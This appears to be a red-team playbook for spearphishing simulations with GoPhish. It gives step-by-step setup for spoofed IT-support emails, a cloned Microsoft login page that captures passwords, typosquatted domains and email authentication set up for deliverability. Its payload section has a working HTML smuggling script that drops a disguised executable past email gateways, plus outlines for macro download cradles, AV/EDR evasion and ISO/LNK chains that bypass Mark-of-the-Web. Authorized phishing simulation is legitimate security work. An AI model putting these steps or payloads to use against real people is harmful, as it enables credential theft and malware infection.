# Spearphishing Simulation Campaign Workflows

## Workflow 1: GoPhish Campaign Setup

### Step 1: Install and Configure GoPhish
```bash
# Download GoPhish
wget https://github.com/gophish/gophish/releases/latest/download/gophish-v0.12.1-linux-64bit.zip
unzip gophish-v0.12.1-linux-64bit.zip -d /opt/gophish
cd /opt/gophish

# Generate SSL certificate for admin panel
openssl req -newkey rsa:2048 -nodes -keyout gophish.key -x509 -days 365 -out gophish.crt

# Edit config.json
# Set admin_server listen_url to 0.0.0.0:3333
# Set phish_server listen_url to 0.0.0.0:443

# Start GoPhish
./gophish
```

### Step 2: Configure Sending Profile
```
Name: Red Team SMTP
SMTP From: it-support@targetcorp-helpdesk.com
Host: mail.phishing-infra.com:587
Username: operator@phishing-infra.com
Password: [SECURE_PASSWORD]
Ignore Certificate Errors: No
Headers:
  X-Mailer: Microsoft Outlook 16.0
  Reply-To: it-support@targetcorp-helpdesk.com
```

### Step 3: Create Email Template
```html
Subject: [ACTION REQUIRED] Password Expiry Notice - {{.FirstName}}

Dear {{.FirstName}} {{.LastName}},

Your corporate password will expire in 24 hours. To maintain
access to company resources, please update your password
immediately using our secure portal.

<a href="{{.URL}}">Update Password Now</a>

This is an automated message from IT Security.
Please complete this action before {{.BaseRecipient}} loses access.

Best regards,
IT Security Team
{{.Tracker}}
```

### Step 4: Create Landing Page
```
Import Site: https://login.microsoftonline.com
Capture Submitted Data: Yes
Capture Passwords: Yes
Redirect To: https://portal.office.com (after credential capture)
```

### Step 5: Configure Target Group
```
Import from CSV:
First Name, Last Name, Email, Position
John,Smith,john.smith@targetcorp.com,IT Manager
Jane,Doe,jane.doe@targetcorp.com,HR Director
```

### Step 6: Launch Campaign
```
Name: RT-2024-001 Password Expiry
Email Template: Password Expiry Notice
Landing Page: O365 Login Clone
Sending Profile: Red Team SMTP
Groups: Target Group Alpha
Launch Date: [SCHEDULED_DATE]
Send Emails By: [STAGGER_OVER_4_HOURS]
```

## Workflow 2: Infrastructure Preparation

### Step 1: Domain Selection and Registration
```bash
# Research similar-looking domains (typosquatting)
# targetcorp.com -> targetcorp-it.com, targetc0rp.com, targetcorp.co

# Domain categorization check
# Use tools like Bluecoat/Symantec Site Review to check categorization
# Uncategorized domains may be blocked

# Register domain through privacy-protected registrar
# Age domain for minimum 2 weeks before use
```

### Step 2: Email Authentication Setup
```bash
# SPF Record
# Type: TXT
# Host: @
# Value: v=spf1 ip4:<MAIL_SERVER_IP> include:_spf.google.com ~all

# DKIM Setup
opendkim-genkey -s default -d phishing-domain.com
# Add TXT record: default._domainkey.phishing-domain.com
# Value: v=DKIM1; k=rsa; p=<PUBLIC_KEY>

# DMARC Record
# Type: TXT
# Host: _dmarc
# Value: v=DMARC1; p=none; rsp=100; adkim=s; aspf=s
```

### Step 3: SSL Certificate Setup
```bash
# Using Let's Encrypt for legitimate SSL
certbot certonly --standalone -d phishing-domain.com
certbot certonly --standalone -d login.phishing-domain.com

# Configure certificates in GoPhish/web server
```

## Workflow 3: Payload Development

### HTML Smuggling Payload
```html
<!-- HTML Smuggling - bypasses email gateway scanning -->
<html>
<body>
<script>
// Base64 encoded payload
var payload = "TVqQAAMAAAAEAAAA..."; // Encoded executable
var binary = atob(payload);
var array = new Uint8Array(binary.length);
for (var i = 0; i < binary.length; i++) {
    array[i] = binary.charCodeAt(i);
}
var blob = new Blob([array], {type: "application/octet-stream"});
var link = document.createElement("a");
link.href = URL.createObjectURL(blob);
link.download = "Update_Required.exe";
link.click();
</script>
<p>Your document is downloading. If the download does not start,
<a href="#" id="manual-download">click here</a>.</p>
</body>
</html>
```

### Macro-Enabled Document Workflow
```
1. Create legitimate-looking document template
2. Add VBA macro for payload execution:
   - AutoOpen() or Document_Open() trigger
   - Download cradle using PowerShell or certutil
   - Execute payload from %TEMP% directory
3. Test against target's known AV/EDR solution
4. Obfuscate macro code to bypass static analysis
```

### ISO/LNK Payload Chain
```
1. Create ISO file containing:
   - Legitimate-looking LNK shortcut
   - Hidden DLL or executable payload
   - Decoy document for user satisfaction
2. LNK file executes hidden payload via:
   - rundll32.exe to load DLL
   - mshta.exe to execute HTA
   - PowerShell download cradle
3. ISO bypasses Mark-of-the-Web (MotW) on older Windows
```

## Workflow 4: Campaign Execution and Monitoring

### Pre-Launch Checklist
```
- [ ] Domain aged and categorized
- [ ] SPF/DKIM/DMARC configured
- [ ] SSL certificates installed
- [ ] Email templates tested for rendering
- [ ] Landing pages functional and capturing data
- [ ] Payload tested against target's security stack
- [ ] C2 callback verified
- [ ] Tracking pixels loading correctly
- [ ] Target list finalized and imported
- [ ] Campaign schedule confirmed with engagement lead
```

### Launch Procedure
```
1. Send initial test email to red team operator
2. Verify delivery, rendering, and link tracking
3. Launch Wave 1: High-priority targets (5-10 users)
4. Monitor for 1 hour - check delivery and open rates
5. Verify no immediate blocks or quarantine
6. Launch Wave 2: Remaining targets (staggered over 2-4 hours)
7. Monitor dashboard continuously for first 4 hours
8. Check for credential captures and payload executions
9. Document all interactions with timestamps
```

### Real-Time Monitoring
```
Track and document:
- Email delivery success/failure rates
- Email open rates (tracking pixel)
- Link click rates
- Credential submission events
- Payload download events
- Callback/beacon events
- User reports to SOC
- Time between delivery and interaction
```

## Workflow 5: Post-Campaign Reporting

### Metrics Calculation
```
Delivery Rate = (Emails Delivered / Emails Sent) x 100
Open Rate = (Unique Opens / Emails Delivered) x 100
Click Rate = (Unique Clicks / Emails Delivered) x 100
Credential Capture Rate = (Credentials Captured / Emails Delivered) x 100
Payload Execution Rate = (Payloads Executed / Emails Delivered) x 100
Report Rate = (Users Who Reported / Emails Delivered) x 100
```

### Evidence Collection
```
For each successful interaction:
1. Screenshot of GoPhish dashboard showing the event
2. Captured credentials (hash, not plaintext in report)
3. C2 beacon screenshot showing initial callback
4. Timeline of events from delivery to compromise
5. Email headers showing delivery path
```
